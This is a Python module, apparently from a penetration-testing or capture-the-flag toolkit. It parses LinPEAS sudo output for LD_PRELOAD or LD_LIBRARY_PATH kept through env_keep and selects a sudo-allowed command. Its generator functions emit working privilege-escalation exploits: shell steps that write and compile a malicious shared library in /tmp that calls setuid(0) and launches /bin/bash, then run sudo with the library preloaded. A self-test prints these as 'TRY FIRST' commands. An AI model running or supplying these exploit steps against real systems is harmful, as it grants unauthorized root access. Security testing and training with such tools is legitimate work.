"""Detect LD_PRELOAD/LD_LIBRARY_PATH abuse via sudo env_keep from LinPEAS output."""

import re
from typing import Dict, List, Optional, Tuple

# Matches env_keep lines: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
_ENV_KEEP_RE = re.compile(
    r'env_keep\s*\+?=\s*"?(LD_(?:PRELOAD|LIBRARY_PATH))"?',
    re.IGNORECASE,
)

# Matches sudo rule lines produced by `sudo -l`
_SUDO_RULE_RE = re.compile(r"\([^)]+\)\s+(.+)", re.IGNORECASE)


def _parse_env_vars(section_text: str) -> List[str]:
    """Return unique LD_* env var names found in env_keep lines, in order."""
    found: List[str] = []
    seen: set = set()
    for line in section_text.splitlines():
        for m in _ENV_KEEP_RE.finditer(line):
            var = m.group(1).upper()
            if var not in seen:
                seen.add(var)
                found.append(var)
    return found


def _parse_first_sudo_command(section_text: str) -> Tuple[Optional[str], bool]:
    """Return (first_sudo_command_path, nopasswd) from the section text.

    Prefers NOPASSWD commands; falls back to any command if none found.
    """
    nopasswd_cmd: Optional[str] = None
    any_cmd: Optional[str] = None

    for line in section_text.splitlines():
        m = _SUDO_RULE_RE.search(line)
        if not m:
            continue
        rest = m.group(1).strip()
        is_nopasswd = "NOPASSWD" in rest.upper()
        # Strip leading flag tokens (NOPASSWD:, SETENV:, PASSWD:, ...)
        cmd_part = re.sub(r"^(?:[A-Za-z_]+\s*:\s*)+", "", rest).strip()
        cmd = cmd_part.split()[0] if cmd_part else ""
        if not cmd or cmd.upper() == "ALL" or not cmd.startswith("/"):
            continue
        if is_nopasswd and nopasswd_cmd is None:
            nopasswd_cmd = cmd
        if any_cmd is None:
            any_cmd = cmd

    if nopasswd_cmd:
        return nopasswd_cmd, True
    if any_cmd:
        return any_cmd, False
    return None, False


def generate_ld_preload_commands(sudo_command: str) -> List[str]:
    """Generate LD_PRELOAD shared-library exploit steps for the given sudo command."""
    return [
        "echo '#include <stdio.h>' > /tmp/preload.c",
        "echo '#include <sys/types.h>' >> /tmp/preload.c",
        "echo '#include <stdlib.h>' >> /tmp/preload.c",
        'echo \'void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }\' >> /tmp/preload.c',
        "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c",
        f"sudo LD_PRELOAD=/tmp/preload.so {sudo_command}",
    ]


def generate_ld_library_path_commands(sudo_command: str) -> List[str]:
    """Generate LD_LIBRARY_PATH shared-library exploit steps for the given sudo command."""
    return [
        "echo '#include <stdio.h>' > /tmp/libcrypt.c",
        "echo '#include <stdlib.h>' >> /tmp/libcrypt.c",
        "echo 'static void hijack() __attribute__((constructor));' >> /tmp/libcrypt.c",
        'echo \'void hijack() { unsetenv("LD_LIBRARY_PATH"); setuid(0); system("/bin/bash"); }\' >> /tmp/libcrypt.c',
        "gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c",
        f"sudo LD_LIBRARY_PATH=/tmp {sudo_command}",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze sudo section for LD_PRELOAD/LD_LIBRARY_PATH env_keep abuse.

    Returns CRITICAL findings when a NOPASSWD sudo command exists, HIGH otherwise.
    Returns an empty list when no env_keep LD_* variable is detected or no sudo
    command is available.
    """
    env_vars = _parse_env_vars(section_text)
    if not env_vars:
        return []

    sudo_command, nopasswd = _parse_first_sudo_command(section_text)
    if sudo_command is None:
        return []

    severity = "CRITICAL" if nopasswd else "HIGH"
    findings: List[Dict] = []

    for var in env_vars:
        if var == "LD_PRELOAD":
            commands = generate_ld_preload_commands(sudo_command)
        else:
            commands = generate_ld_library_path_commands(sudo_command)

        findings.append({
            "env_var": var,
            "sudo_command": sudo_command,
            "severity": severity,
            "type": "ld_preload",
            "nopasswd": nopasswd,
            "commands": commands,
        })

    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
Matching Defaults entries for ctf on target:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User ctf may run the following commands on target:
    (root) NOPASSWD: /usr/sbin/apache2
    (root) /usr/bin/find
"""

    print("=== _parse_env_vars ===")
    print("Vars:", _parse_env_vars(SAMPLE))

    print("\n=== _parse_first_sudo_command ===")
    cmd, np = _parse_first_sudo_command(SAMPLE)
    print(f"Command: {cmd}, NOPASSWD: {np}")

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        cmds = finding["commands"]
        print(
            f"[{finding['severity']}] {finding['type']} -> {finding['env_var']}"
            f"  (via: {finding['sudo_command']}, nopasswd={finding['nopasswd']},"
            f" {len(cmds)} cmd(s))"
        )
        print(f"    TRY FIRST: $ {cmds[0]}")
        for c in cmds[1:]:
            print(f"             $ {c}")
